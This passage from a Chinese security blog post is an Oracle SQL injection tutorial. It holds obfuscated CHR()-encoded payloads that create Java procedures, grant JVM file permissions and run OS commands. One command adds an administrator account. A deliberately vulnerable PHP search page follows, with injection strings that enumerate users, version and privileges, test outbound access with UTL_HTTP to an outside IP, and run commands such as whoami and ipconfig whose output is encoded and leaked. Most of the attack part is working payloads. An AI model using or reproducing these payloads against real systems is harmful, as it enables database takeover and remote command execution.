3)||CHR(46)||CHR(73)||CHR(77)||CHR(80)||CHR(79)||CHR(82)||CHR(84)||CHR(95)||CHR(74)||CHR(86)||CHR(77)||CHR(95)||CHR(80)||CHR(69)||CHR(82)||CHR(77)||CHR(83)||CHR(40)||CHR(80)||CHR(79)||CHR(76)||CHR(41)||CHR(59)||CHR(69)||CHR(78)||CHR(68)||CHR(59)||CHR(39)||CHR(39)||CHR(59)||CHR(99)||CHR(111)||CHR(109)||CHR(109)||CHR(105)||CHR(116)||CHR(59)||CHR(114)||CHR(101)||CHR(116)||CHR(117)||CHR(114)||CHR(110)||CHR(32)||CHR(49)||CHR(59)||CHR(101)||CHR(110)||CHR(100)||CHR(59)||CHR(39)||CHR(59)||CHR(32)||CHR(32)||CHR(32)||CHR(99)||CHR(111)||CHR(109)||CHR(109)||CHR(105)||CHR(116)||CHR(59)||CHR(32)||CHR(101)||CHR(110)||CHR(100)||CHR(59)) is not null--
+' and 1=myjava()--
+' and dbms_xmlquery.newcontext(CHR(100)||CHR(101)||CHR(99)||CHR(108)||CHR(97)||CHR(114)||CHR(101)||CHR(32)||CHR(80)||CHR(82)||CHR(65)||CHR(71)||CHR(77)||CHR(65)||CHR(32)||CHR(65)||CHR(85)||CHR(84)||CHR(79)||CHR(78)||CHR(79)||CHR(77)||CHR(79)||CHR(85)||CHR(83)||CHR(95)||CHR(84)||CHR(82)||CHR(65)||CHR(78)||CHR(83)||CHR(65)||CHR(67)||CHR(84)||CHR(73)||CHR(79)||CHR(78)||CHR(59)||CHR(32)||CHR(98)||CHR(101)||CHR(103)||CHR(105)||CHR(110)||CHR(32)||CHR(101)||CHR(120)||CHR(101)||CHR(99)||CHR(117)||CHR(116)||CHR(101)||CHR(32)||CHR(105)||CHR(109)||CHR(109)||CHR(101)||CHR(100)||CHR(105)||CHR(97)||CHR(116)||CHR(101)||CHR(32)||CHR(39)||CHR(99)||CHR(114)||CHR(101)||CHR(97)||CHR(116)||CHR(101)||CHR(32)||CHR(111)||CHR(114)||CHR(32)||CHR(114)||CHR(101)||CHR(112)||CHR(108)||CHR(97)||CHR(99)||CHR(101)||CHR(32)||CHR(102)||CHR(117)||CHR(110)||CHR(99)||CHR(116)||CHR(105)||CHR(111)||CHR(110)||CHR(32)||CHR(109)||CHR(121)||CHR(106)||CHR(97)||CHR(118)||CHR(97)||CHR(49)||CHR(32)||CHR(114)||CHR(101)||CHR(116)||CHR(117)||CHR(114)||CHR(110)||CHR(32)||CHR(110)||CHR(117)||CHR(109)||CHR(98)||CHR(101)||CHR(114)||CHR(32)||CHR(105)||CHR(115)||CHR(32)||CHR(80)||CHR(82)||CHR(65)||CHR(71)||CHR(77)||CHR(65)||CHR(32)||CHR(65)||CHR(85)||CHR(84)||CHR(79)||CHR(78)||CHR(79)||CHR(77)||CHR(79)||CHR(85)||CHR(83)||CHR(95)||CHR(84)||CHR(82)||CHR(65)||CHR(78)||CHR(83)||CHR(65)||CHR(67)||CHR(84)||CHR(73)||CHR(79)||CHR(78)||CHR(59)||CHR(32)||CHR(98)||CHR(101)||CHR(103)||CHR(105)||CHR(110)||CHR(32)||CHR(101)||CHR(120)||CHR(101)||CHR(99)||CHR(117)||CHR(116)||CHR(101)||CHR(32)||CHR(105)||CHR(109)||CHR(109)||CHR(101)||CHR(100)||CHR(105)||CHR(97)||CHR(116)||CHR(101)||CHR(32)||CHR(39)||CHR(39)||CHR(68)||CHR(69)||CHR(67)||CHR(76)||CHR(65)||CHR(82)||CHR(69)||CHR(32)||CHR(80)||CHR(79)||CHR(76)||CHR(32)||CHR(68)||CHR(66)||CHR(77)||CHR(83)||CHR(95)||CHR(74)||CHR(86)||CHR(77)||CHR(95)||CHR(69)||CHR(88)||CHR(80)||CHR(95)||CHR(80)||CHR(69)||CHR(82)||CHR(77)||CHR(83)||CHR(46)||CHR(84)||CHR(69)||CHR(77)||CHR(80)||CHR(95)||CHR(74)||CHR(65)||CHR(86)||CHR(65)||CHR(95)||CHR(80)||CHR(79)||CHR(76)||CHR(73)||CHR(67)||CHR(89)||CHR(59)||CHR(67)||CHR(85)||CHR(82)||CHR(83)||CHR(79)||CHR(82)||CHR(32)||CHR(67)||CHR(49)||CHR(32)||CHR(73)||CHR(83)||CHR(32)||CHR(83)||CHR(69)||CHR(76)||CHR(69)||CHR(67)||CHR(84)||CHR(32)||CHR(39)||CHR(39)||CHR(39)||CHR(39)||CHR(71)||CHR(82)||CHR(65)||CHR(78)||CHR(84)||CHR(39)||CHR(39)||CHR(39)||CHR(39)||CHR(44)||CHR(85)||CHR(83)||CHR(69)||CHR(82)||CHR(40)||CHR(41)||CHR(44)||CHR(32)||CHR(39)||CHR(39)||CHR(39)||CHR(39)||CHR(83)||CHR(89)||CHR(83)||CHR(39)||CHR(39)||CHR(39)||CHR(39)||CHR(44)||CHR(39)||CHR(39)||CHR(39)||CHR(39)||CHR(106)||CHR(97)||CHR(118)||CHR(97)||CHR(46)||CHR(108)||CHR(97)||CHR(110)||CHR(103)||CHR(46)||CHR(82)||CHR(117)||CHR(110)||CHR(116)||CHR(105)||CHR(109)||CHR(101)||CHR(80)||CHR(101)||CHR(114)||CHR(109)||CHR(105)||CHR(115)||CHR(115)||CHR(105)||CHR(111)||CHR(110)||CHR(39)||CHR(39)||CHR(39)||CHR(39)||CHR(44)||CHR(32)||CHR(39)||CHR(39)||CHR(39)||CHR(39)||CHR(119)||CHR(114)||CHR(105)||CHR(116)||CHR(101)||CHR(70)||CHR(105)||CHR(108)||CHR(101)||CHR(68)||CHR(101)||CHR(115)||CHR(99)||CHR(114)||CHR(105)||CHR(112)||CHR(116)||CHR(111)||CHR(114)||CHR(39)||CHR(39)||CHR(39)||CHR(39)||CHR(44)||CHR(39)||CHR(39)||CHR(39)||CHR(39)||CHR(42)||CHR(39)||CHR(39)||CHR(39)||CHR(39)||CHR(44)||CHR(39)||CHR(39)||CHR(39)||CHR(39)||CHR(69)||CHR(78)||CHR(65)||CHR(66)||CHR(76)||CHR(69)||CHR(68)||CHR(39)||CHR(39)||CHR(39)||CHR(39)||CHR(32)||CHR(102)||CHR(114)||CHR(111)||CHR(109)||CHR(32)||CHR(100)||CHR(117)||CHR(97)||CHR(108)||CHR(59)||CHR(66)||CHR(69)||CHR(71)||CHR(73)||CHR(78)||CHR(32)||CHR(79)||CHR(80)||CHR(69)||CHR(78)||CHR(32)||CHR(67)||CHR(49)||CHR(59)||CHR(32)||CHR(70)||CHR(69)||CHR(84)||CHR(67)||CHR(72)||CHR(32)||CHR(67)||CHR(49)||CHR(32)||CHR(66)||CHR(85)||CHR(76)||CHR(75)||CHR(32)||CHR(67)||CHR(79)||CHR(76)||CHR(76)||CHR(69)||CHR(67)||CHR(84)||CHR(32)||CHR(73)||CHR(78)||CHR(84)||CHR(79)||CHR(32)||CHR(80)||CHR(79)||CHR(76)||CHR(59)||CHR(67)||CHR(76)||CHR(79)||CHR(83)||CHR(69)||CHR(32)||CHR(67)||CHR(49)||CHR(59)||CHR(68)||CHR(66)||CHR(77)||CHR(83)||CHR(95)||CHR(74)||CHR(86)||CHR(77)||CHR(95)||CHR(69)||CHR(88)||CHR(80)||CHR(95)||CHR(80)||CHR(69)||CHR(82)||CHR(77)||CHR(83)||CHR(46)||CHR(73)||CHR(77)||CHR(80)||CHR(79)||CHR(82)||CHR(84)||CHR(95)||CHR(74)||CHR(86)||CHR(77)||CHR(95)||CHR(80)||CHR(69)||CHR(82)||CHR(77)||CHR(83)||CHR(40)||CHR(80)||CHR(79)||CHR(76)||CHR(41)||CHR(59)||CHR(69)||CHR(78)||CHR(68)||CHR(59)||CHR(39)||CHR(39)||CHR(59)||CHR(99)||CHR(111)||CHR(109)||CHR(109)||CHR(105)||CHR(116)||CHR(59)||CHR(114)||CHR(101)||CHR(116)||CHR(117)||CHR(114)||CHR(110)||CHR(32)||CHR(49)||CHR(59)||CHR(101)||CHR(110)||CHR(100)||CHR(59)||CHR(39)||CHR(59)||CHR(32)||CHR(99)||CHR(111)||CHR(109)||CHR(109)||CHR(105)||CHR(116)||CHR(59)||CHR(32)||CHR(101)||CHR(110)||CHR(100)||CHR(59)) is not null--
+' and 1=myjava1()--
+' and dbms_xmlquery.newcontext(CHR(100)||CHR(101)||CHR(99)||CHR(108)||CHR(97)||CHR(114)||CHR(101)||CHR(32)||CHR(80)||CHR(82)||CHR(65)||CHR(71)||CHR(77)||CHR(65)||CHR(32)||CHR(65)||CHR(85)||CHR(84)||CHR(79)||CHR(78)||CHR(79)||CHR(77)||CHR(79)||CHR(85)||CHR(83)||CHR(95)||CHR(84)||CHR(82)||CHR(65)||CHR(78)||CHR(83)||CHR(65)||CHR(67)||CHR(84)||CHR(73)||CHR(79)||CHR(78)||CHR(59)||CHR(32)||CHR(98)||CHR(101)||CHR(103)||CHR(105)||CHR(110)||CHR(32)||CHR(101)||CHR(120)||CHR(101)||CHR(99)||CHR(117)||CHR(116)||CHR(101)||CHR(32)||CHR(105)||CHR(109)||CHR(109)||CHR(101)||CHR(100)||CHR(105)||CHR(97)||CHR(116)||CHR(101)||CHR(32)||CHR(39)||CHR(99)||CHR(114)||CHR(101)||CHR(97)||CHR(116)||CHR(101)||CHR(32)||CHR(111)||CHR(114)||CHR(32)||CHR(114)||CHR(101)||CHR(112)||CHR(108)||CHR(97)||CHR(99)||CHR(101)||CHR(32)||CHR(102)||CHR(117)||CHR(110)||CHR(99)||CHR(116)||CHR(105)||CHR(111)||CHR(110)||CHR(32)||CHR(109)||CHR(121)||CHR(106)||CHR(97)||CHR(118)||CHR(97)||CHR(50)||CHR(32)||CHR(114)||CHR(101)||CHR(116)||CHR(117)||CHR(114)||CHR(110)||CHR(32)||CHR(110)||CHR(117)||CHR(109)||CHR(98)||CHR(101)||CHR(114)||CHR(32)||CHR(105)||CHR(115)||CHR(32)||CHR(80)||CHR(82)||CHR(65)||CHR(71)||CHR(77)||CHR(65)||CHR(32)||CHR(65)||CHR(85)||CHR(84)||CHR(79)||CHR(78)||CHR(79)||CHR(77)||CHR(79)||CHR(85)||CHR(83)||CHR(95)||CHR(84)||CHR(82)||CHR(65)||CHR(78)||CHR(83)||CHR(65)||CHR(67)||CHR(84)||CHR(73)||CHR(79)||CHR(78)||CHR(59)||CHR(32)||CHR(98)||CHR(101)||CHR(103)||CHR(105)||CHR(110)||CHR(32)||CHR(101)||CHR(120)||CHR(101)||CHR(99)||CHR(117)||CHR(116)||CHR(101)||CHR(32)||CHR(105)||CHR(109)||CHR(109)||CHR(101)||CHR(100)||CHR(105)||CHR(97)||CHR(116)||CHR(101)||CHR(32)||CHR(39)||CHR(39)||CHR(68)||CHR(69)||CHR(67)||CHR(76)||CHR(65)||CHR(82)||CHR(69)||CHR(32)||CHR(80)||CHR(79)||CHR(76)||CHR(32)||CHR(68)||CHR(66)||CHR(77)||CHR(83)||CHR(95)||CHR(74)||CHR(86)||CHR(77)||CHR(95)||CHR(69)||CHR(88)||CHR(80)||CHR(95)||CHR(80)||CHR(69)||CHR(82)||CHR(77)||CHR(83)||CHR(46)||CHR(84)||CHR(69)||CHR(77)||CHR(80)||CHR(95)||CHR(74)||CHR(65)||CHR(86)||CHR(65)||CHR(95)||CHR(80)||CHR(79)||CHR(76)||CHR(73)||CHR(67)||CHR(89)||CHR(59)||CHR(67)||CHR(85)||CHR(82)||CHR(83)||CHR(79)||CHR(82)||CHR(32)||CHR(67)||CHR(49)||CHR(32)||CHR(73)||CHR(83)||CHR(32)||CHR(83)||CHR(69)||CHR(76)||CHR(69)||CHR(67)||CHR(84)||CHR(32)||CHR(39)||CHR(39)||CHR(39)||CHR(39)||CHR(71)||CHR(82)||CHR(65)||CHR(78)||CHR(84)||CHR(39)||CHR(39)||CHR(39)||CHR(39)||CHR(44)||CHR(85)||CHR(83)||CHR(69)||CHR(82)||CHR(40)||CHR(41)||CHR(44)||CHR(32)||CHR(39)||CHR(39)||CHR(39)||CHR(39)||CHR(83)||CHR(89)||CHR(83)||CHR(39)||CHR(39)||CHR(39)||CHR(39)||CHR(44)||CHR(39)||CHR(39)||CHR(39)||CHR(39)||CHR(106)||CHR(97)||CHR(118)||CHR(97)||CHR(46)||CHR(108)||CHR(97)||CHR(110)||CHR(103)||CHR(46)||CHR(82)||CHR(117)||CHR(110)||CHR(116)||CHR(105)||CHR(109)||CHR(101)||CHR(80)||CHR(101)||CHR(114)||CHR(109)||CHR(105)||CHR(115)||CHR(115)||CHR(105)||CHR(111)||CHR(110)||CHR(39)||CHR(39)||CHR(39)||CHR(39)||CHR(44)||CHR(32)||CHR(39)||CHR(39)||CHR(39)||CHR(39)||CHR(114)||CHR(101)||CHR(97)||CHR(100)||CHR(70)||CHR(105)||CHR(108)||CHR(101)||CHR(68)||CHR(101)||CHR(115)||CHR(99)||CHR(114)||CHR(105)||CHR(112)||CHR(116)||CHR(111)||CHR(114)||CHR(39)||CHR(39)||CHR(39)||CHR(39)||CHR(44)||CHR(39)||CHR(39)||CHR(39)||CHR(39)||CHR(42)||CHR(39)||CHR(39)||CHR(39)||CHR(39)||CHR(44)||CHR(39)||CHR(39)||CHR(39)||CHR(39)||CHR(69)||CHR(78)||CHR(65)||CHR(66)||CHR(76)||CHR(69)||CHR(68)||CHR(39)||CHR(39)||CHR(39)||CHR(39)||CHR(32)||CHR(102)||CHR(114)||CHR(111)||CHR(109)||CHR(32)||CHR(100)||CHR(117)||CHR(97)||CHR(108)||CHR(59)||CHR(66)||CHR(69)||CHR(71)||CHR(73)||CHR(78)||CHR(32)||CHR(79)||CHR(80)||CHR(69)||CHR(78)||CHR(32)||CHR(67)||CHR(49)||CHR(59)||CHR(32)||CHR(70)||CHR(69)||CHR(84)||CHR(67)||CHR(72)||CHR(32)||CHR(67)||CHR(49)||CHR(32)||CHR(66)||CHR(85)||CHR(76)||CHR(75)||CHR(32)||CHR(67)||CHR(79)||CHR(76)||CHR(76)||CHR(69)||CHR(67)||CHR(84)||CHR(32)||CHR(73)||CHR(78)||CHR(84)||CHR(79)||CHR(32)||CHR(80)||CHR(79)||CHR(76)||CHR(59)||CHR(67)||CHR(76)||CHR(79)||CHR(83)||CHR(69)||CHR(32)||CHR(67)||CHR(49)||CHR(59)||CHR(68)||CHR(66)||CHR(77)||CHR(83)||CHR(95)||CHR(74)||CHR(86)||CHR(77)||CHR(95)||CHR(69)||CHR(88)||CHR(80)||CHR(95)||CHR(80)||CHR(69)||CHR(82)||CHR(77)||CHR(83)||CHR(46)||CHR(73)||CHR(77)||CHR(80)||CHR(79)||CHR(82)||CHR(84)||CHR(95)||CHR(74)||CHR(86)||CHR(77)||CHR(95)||CHR(80)||CHR(69)||CHR(82)||CHR(77)||CHR(83)||CHR(40)||CHR(80)||CHR(79)||CHR(76)||CHR(41)||CHR(59)||CHR(69)||CHR(78)||CHR(68)||CHR(59)||CHR(39)||CHR(39)||CHR(59)||CHR(99)||CHR(111)||CHR(109)||CHR(109)||CHR(105)||CHR(116)||CHR(59)||CHR(114)||CHR(101)||CHR(116)||CHR(117)||CHR(114)||CHR(110)||CHR(32)||CHR(49)||CHR(59)||CHR(101)||CHR(110)||CHR(100)||CHR(59)||CHR(39)||CHR(59)||CHR(32)||CHR(99)||CHR(111)||CHR(109)||CHR(109)||CHR(105)||CHR(116)||CHR(59)||CHR(32)||CHR(101)||CHR(110)||CHR(100)||CHR(59)) is not null--
+' and 1=myjava2()--
+' and 1=2 union select 1,(select javacmd('whoami') from dual),3 from dual--
+
+如果有了java.io.permisson(or javasyspriv)权限的话也可以调用下面有漏洞的包直接执行系统命令
+DBMS_JAVA.RUNJAVA() 11g R1 and R2
+SELECT DBMS_JAVA.RUNJAVA('oracle/aurora/util/Wrapper c:\\windows\\system32\\cmd.exe /c net user admin password /add') FROM DUAL;
+DBMS_JAVA_TEST.FUNCALL()  10g R2, 11g R1 and R2
+Select DBMS_JAVA_TEST.FUNCALL('oracle/aurora/util/Wrapper','main','/bin/bash','-c','pwd &gt; /tmp/pwd.txt') from dual;
+Select DBMS_JAVA_TEST.FUNCALL('oracle/aurora/util/Wrapper','main','c:\\windows\\system32\\cmd.exe','/c','dir &gt; c:\\pwd.txt') from dual; #windows ORA-29540: class oracle/aurora/util/Wrapper does not exist
+</code></pre></div></div>
+
+<h3 id="0x3-实战">0x3 实战</h3>
+<p>这里利用上面的一个总结，进行一个实战。</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>数据库表如下：
+create table users(id int,name varchar(255),age int);
+INSERT INTO users VALUES ('1', 'test', '22');
+INSERT INTO users VALUES ('2', 'admin', '33');
+INSERT INTO users VALUES ('3', 'aaaa', '44');
+commit;
+服务端代码如下：
+<span class="cp">&lt;?php</span>
+<span class="k">function</span> <span class="nf">query</span><span class="p">(</span><span class="nv">$name</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nv">$db</span> <span class="o">=</span> <span class="s2">"(DESCRIPTION=(ADDRESS_LIST = (ADDRESS = (PROTOCOL = TCP)(HOST = 192.168.44.157)(PORT = 1521)))(CONNECT_DATA=(SID=orcl)))"</span><span class="p">;</span> 
+    <span class="nv">$conn</span> <span class="o">=</span> <span class="nb">oci_connect</span><span class="p">(</span><span class="s1">'TEST'</span><span class="p">,</span> <span class="s1">'test123456789'</span><span class="p">,</span> <span class="nv">$db</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span> <span class="nv">$conn</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">die</span><span class="p">(</span><span class="s1">'Cannot connect to the database: '</span><span class="o">.</span> <span class="nb">oci_error</span><span class="p">());</span>
+    <span class="p">}</span>
+    <span class="nv">$stat</span> <span class="o">=</span> <span class="nb">oci_parse</span><span class="p">(</span><span class="nv">$conn</span><span class="p">,</span> <span class="s2">"SELECT id,name,age FROM TEST.users WHERE name LIKE '%"</span><span class="o">.</span> <span class="nv">$name</span> <span class="o">.</span><span class="s2">"%'"</span><span class="p">);</span>
+    <span class="k">echo</span> <span class="s2">"SELECT id,name,age FROM TEST.users WHERE name LIKE '%"</span><span class="o">.</span> <span class="nv">$name</span> <span class="o">.</span><span class="s2">"%'"</span><span class="p">;</span>
+    <span class="nb">oci_execute</span><span class="p">(</span><span class="nv">$stat</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nv">$stat</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">echo</span> <span class="s1">'&lt;table&gt;'</span><span class="p">;</span>
+        <span class="k">echo</span> <span class="s1">'&lt;tr&gt;&lt;th&gt;ID&lt;/th&gt;&lt;th&gt;Name&lt;/th&gt;&lt;th&gt;Age&lt;/th&gt;&lt;/tr&gt;'</span><span class="p">;</span>
+        <span class="k">while</span> <span class="p">((</span><span class="nv">$row</span> <span class="o">=</span> <span class="nb">oci_fetch_array</span><span class="p">(</span><span class="nv">$stat</span><span class="p">,</span> <span class="nx">OCI_BOTH</span><span class="p">))</span> <span class="o">!=</span> <span class="kc">false</span><span class="p">)</span> <span class="p">{</span>
+            <span class="k">echo</span> <span class="s1">'&lt;tr&gt;'</span><span class="p">;</span>
+            <span class="k">echo</span> <span class="s1">'&lt;td&gt;'</span><span class="o">.</span> <span class="nv">$row</span><span class="p">[</span><span class="s1">'ID'</span><span class="p">]</span> <span class="o">.</span><span class="s1">'&lt;/td&gt;'</span><span class="p">;</span>
+            <span class="k">echo</span> <span class="s1">'&lt;td&gt;'</span><span class="o">.</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$row</span><span class="p">[</span><span class="s1">'NAME'</span><span class="p">])</span> <span class="o">.</span><span class="s1">'&lt;/td&gt;'</span><span class="p">;</span>
+            <span class="k">echo</span> <span class="s1">'&lt;td&gt;'</span><span class="o">.</span> <span class="nv">$row</span><span class="p">[</span><span class="s1">'AGE'</span><span class="p">]</span> <span class="o">.</span><span class="s1">'&lt;/td&gt;'</span><span class="p">;</span>
+            <span class="k">echo</span> <span class="s1">'&lt;/tr&gt;'</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="k">echo</span> <span class="s1">'&lt;/table&gt;'</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="nb">oci_free_statement</span><span class="p">(</span><span class="nv">$stat</span><span class="p">);</span>
+    <span class="nb">oci_close</span><span class="p">(</span><span class="nv">$conn</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'name'</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'name'</span><span class="p">]))</span> <span class="p">{</span>
+    <span class="nx">query</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'name'</span><span class="p">]);</span>
+<span class="p">}</span>
+
+<span class="cp">?&gt;</span>
+
+<span class="nt">&lt;form</span> <span class="na">method=</span><span class="s">"POST"</span><span class="nt">&gt;</span>
+<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">name=</span><span class="s">"name"</span> <span class="na">length=</span><span class="s">"15"</span><span class="nt">&gt;&lt;input</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">value=</span><span class="s">"Search"</span><span class="nt">&gt;</span>
+<span class="nt">&lt;/form&gt;</span>
+</code></pre></div></div>
+<p>搜索框注入 搜索a 可以看到相关sql语句 
+ <img src="/images/posts/hackingoracle/WX20180619-171718@2x.png" alt="image" /></p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>' and 1 = ctxsys.drithsx.sn(1,(select user from dual))--
+ 查当前用户 TEST
+</code></pre></div></div>
+<p><img src="/images/posts/hackingoracle/2.png" alt="image" /></p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>' and 1 = ctxsys.drithsx.sn(1,(SELECT banner FROM v$version WHERE banner LIKE 'Oracle%'))--
+ 查看版本 Oracle Database 10g Enterprise Edition Release 10.2.0.3.0 
+</code></pre></div></div>
+<p><img src="/images/posts/hackingoracle/3.png" alt="image" /></p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>' and UTL_HTTP.REQUEST('http://74.121.151.89:53')='1'--判断能否出网 能出网
+</code></pre></div></div>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code> ' and 1 = ctxsys.drithsx.sn(1,(select wmsys.wm_concat(granted_role) from user_role_privs))--
+查当前用户权限 CONNECT,RESOURCE
+</code></pre></div></div>
+<p><img src="/images/posts/hackingoracle/4.png" alt="image" /> 
+提权到dba皆失败<br />
+11.1.0.7.0以下可以用dbms_xmlquery.newcontext来执行pl/sql来执行命令(命令在上面)
+  <img src="/images/posts/hackingoracle/5.png" alt="image" /> 
+依次执行上面sql语句后 可以在navicat中查看
+执行select * from user_objects可以查看相关函数是否创建成功
+<img src="/images/posts/hackingoracle/6.png" alt="image" /> 
+执行select * from user_java_policy 查看其相应的权限是否加上
+<img src="/images/posts/hackingoracle/7.png" alt="image" /> 
+在web中 可以使用下面的语句来判断是否加上</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>' and 1 = ctxsys.drithsx.sn(1,(select count(*) from user_java_policy where grantee_name='TEST'))--
+' and 1 = ctxsys.drithsx.sn(1,(select * from user_objects where OBJECT_NAME='javaexec'))--
+</code></pre></div></div>
+<p>最后执行命令 whoami会报错(具体原因不详) 但程序还是会执行 想要实时查看可以换个命令 以下分别是四个截图的效果</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>'||utl_inaddr.get_host_name((select javacmd('whoami') from dual))||'
+'||utl_inaddr.get_host_name((select javacmd('ping 8.8.8.8') from dual))||'
+'||utl_inaddr.get_host_name((Select DBMS_JAVA_TEST.FUNCALL('oracle/aurora/util/Wrapper','main','c:\\windows\\system32\\cmd.exe','/c','ping 74.121.151.89') from dual))||'   #注意这个不能回显
+'||utl_inaddr.get_host_name((select utl_raw.cast_to_varchar2(utl_encode.base64_encode(utl_raw.cast_to_raw(javacmd('ipconfig')))) from dual))||' #有的时候使用base64加密后看着稍微舒服一点
+</code></pre></div></div>
+<p>whoami
+<img src="/images/posts/hackingoracle/8.png" alt="image" /> 
+ping 8.8.8.8
+<img src="/images/posts/hackingoracle/9.png" alt="image" /> 
+DBMS_JAVA_TEST.FUNCAL
+<img src="/images/posts/hackingoracle/10.png" alt="image" /> 
+base64 encode
+<img src="/images/posts/hackingoracle/12.png" alt="image" /> 
+一些需要注意的坑：</p>
+<ul>
+  <li>有的语句直接放到navicat里面是可以执行的，但是通过web执行会出问题，所有建议本地测试后再转码运行，一般情况下oracle中双引号会包含特定字符，所以一般会看到一些’’'’成对的双引号，转码时’’'’变成’’ ‘‘变成’ ‘直接去除就可以了。 <br />
+其他参考链接如下：
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://redn3ck.github.io/2018/04/25/Oracle%E6%B3%A8%E5%85%A5-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-Shell%E5%8F%8D%E5%BC%B9/
+https://www.t00ls.net/articles-23608.html
+https://github.com/alexei-led/docker-oracle-xe-11g
+https://www.secpulse.com/archives/30872.html
+http://psoug.org/articles/Hacking-Aurora-in-Oracle-11g.htm
+http://www.red-database-security.com/tutorial/run_os_commands_via_webapp.html
+</code></pre></div>    </div>
+    <p>#
+转载请注明：<a href="https://notwhy.github.io/">whynot</a> » <a href="https://notwhy.gitbooks.io//2018/06/hacking-oracle/">hacking_ora</a></p>
+  </li>
+</ul>
+
+
+
+  </section>
+</article>
+
+<section>
+
+            <div class="content-play">
+              <p><a href="javascript:void(0)" onclick="dashangToggle()" class="dashang" title="打赏，支持一下">打赏一个呗</a></p>
+              <div class="hide_box-play"></div>
+              <div class="shang_box-play">
+                <a class="shang_close-play" href="javascript:void(0)" onclick="dashangToggle()" title="关闭"><img src="/images/payimg/close.jpg" alt="取消" /></a>
+                <div class="shang_tit-play">
+                  <p>感谢您的支持，我会继续努力的!</p>
+                </div>
+                <div class="shang_payimg">
+                    <img src="/images/payimg/alipayimg.jpg" alt="扫码支持" title="扫一扫" />
+                </div>
+              <div class="shang_payimg">    
+                    <img src="/images/payimg/weipayimg.jpg" alt="扫码支持" title="扫一扫" />
+                </div>
+                <div class="pay_explain">扫码打赏，你说多少就多少</div>
+                <div class="shang_payselect">
+                  <div class="pay_item checked" data-id="alipay">
+                    <span class="pay_logo"><img src="/images/payimg/alipay.jpg" alt="支付宝" /></span>
+                  </div>
+                  <div class="pay_item" data-id="weipay">
+                    <span class="pay_logo"><img src="/images/payimg/wechat.jpg" alt="微信" /></span>
+                  </div>
+                </div>
+                <div class="shang_info-play">
+                  <p>打开<span id="shang_pay_txt">支付宝</span>扫一扫，即可进行扫码打赏哦</p>
+                </div>
+              </div>
+            </div>
+            <script type="text/javascript">
+            function dashangToggle(){
+              $(".hide_box-play").fadeToggle();
+              $(".shang_box-play").fadeToggle();
+            }
+            </script>
+
+            <div style="text-align:center;margin:50px 0; font:normal 14px/24px 'MicroSoft YaHei';"></div>
+
+            <style type="text/css">
+              .content-play{width:80%;margin-top: 20px;margin-bottom: 10px;height:40px;}
+              .hide_box-play{z-index:999;filter:alpha(opacity=50);background:#666;opacity: 0.5;-moz-opacity: 0.5;left:0;top:0;height:99%;width:100%;position:fixed;display:none;}
+              .shang_box-play{width:540px;height:540px;padding:10px;background-color:#fff;border-radius:10px;position:fixed;z-index:1000;left:50%;top:50%;margin-left:-280px;margin-top:-280px;border:1px dotted #dedede;display:none;}
+              .shang_box-play img{border:none;border-width:0;}
+              .dashang{display:block;width:100px;margin:5px auto;height:25px;line-height:25px;padding:10px;background-color:#E74851;color:#fff;text-align:center;text-decoration:none;border-radius:10px;font-weight:bold;font-size:16px;transition: all 0.3s;}
+              .dashang:hover{opacity:0.8;padding:15px;font-size:18px;}
+              .shang_close-play{float:right;display:inline-block;
+                margin-right: 10px;margin-top: 20px;
+              }
+              .shang_logo{display:block;text-align:center;margin:20px auto;}
+              .shang_tit-play{width: 100%;height: 75px;text-align: center;line-height: 66px;color: #a3a3a3;font-size: 16px;background: url('/images/payimg/cy-reward-title-bg.jpg');font-family: 'Microsoft YaHei';margin-top: 7px;margin-right:2px;}
+              .shang_tit-play p{color:#a3a3a3;text-align:center;font-size:16px;}
+              .shang_payimg{width:140px;padding:10px;padding-left: 80px; /*border:6px solid #EA5F00;**/margin:0 auto;border-radius:3px;height:140px;display:inline-block;}
+              .shang_payimg img{display:inline-block;margin-right:10px;float:left;text-align:center;width:140px;height:140px; }
+              .pay_explain{text-align:center;margin:10px auto;font-size:12px;color:#545454;}
+              .shang_payselect{text-align:center;margin:0 auto;margin-top:40px;cursor:pointer;height:60px;width:500px;margin-left:110px;}
+              .shang_payselect .pay_item{display:inline-block;margin-right:140px;float:left;}
+              .shang_info-play{clear:both;}
+              .shang_info-play p,.shang_info-play a{color:#C3C3C3;text-align:center;font-size:12px;text-decoration:none;line-height:2em;}
+            </style>
+
+       <ul class="pager">
+        
+        
+        <li class="next">
+            <a href="/2018/06/sql-injection-fuck-waf/" data-toggle="tooltip" data-placement="top" title="sql-injection-fuck-waf">下一篇：  <span>sql-injection-fuck-waf</span>
+            </a>
+        </li>
+        
+    </ul>
+</section>
+
+<section class="post-comments">
+
+  
+    <div id="disqus_thread"></div>
+    <script>
+    
+    var disqus_config = function () {
+        this.page.url = "http://localhost:4000/2018/06/hacking-oracle/";
+        this.page.identifier = "/2018/06/hacking-oracle/";
+    };
+    var disqus_shortname = 'whynot1';
+    
+    (function() { // DON'T EDIT BELOW THIS LINE
+        var d = document, s = d.createElement('script');
